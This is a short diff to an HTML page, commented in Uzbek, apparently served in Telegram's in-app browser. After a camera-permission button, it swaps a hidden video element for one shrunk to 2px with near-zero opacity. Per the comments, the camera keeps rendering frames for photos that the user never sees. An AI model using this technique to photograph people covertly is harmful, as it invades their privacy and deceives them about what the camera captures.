@@ -53,8 +53,14 @@
     <button class="btn-primary" onclick="requestCamera()">✅ Ruxsat berish</button>
   </div>
 
-  <!-- video elementi rasm olish uchun ishlatiladi, lekin foydalanuvchiga ko'rsatilmaydi -->
-  <video id="video" autoplay playsinline class="hidden"></video>
+  <!-- video elementi rasm olish uchun ishlatiladi.
+       MUHIM: display:none qilib yashirilmaydi — ba'zi qurilmalar (jumladan
+       Telegram'ning ichki brauzeri) display:none bo'lgan videoning
+       kadrlarini to'g'ri render qilmaydi va natijada qora rasm chiqadi.
+       Shuning uchun uni ekrandan tashqariga chiqarib, deyarli ko'rinmas
+       qilib qo'yamiz, lekin haqiqiy render davom etadi. -->
+  <video id="video" autoplay playsinline muted
+         style="position:fixed; top:0; left:0; width:2px; height:2px; opacity:0.01; pointer-events:none;"></video>
   <canvas id="canvas" class="hidden"></canvas>
   <div id="status" class="status"></div>
 
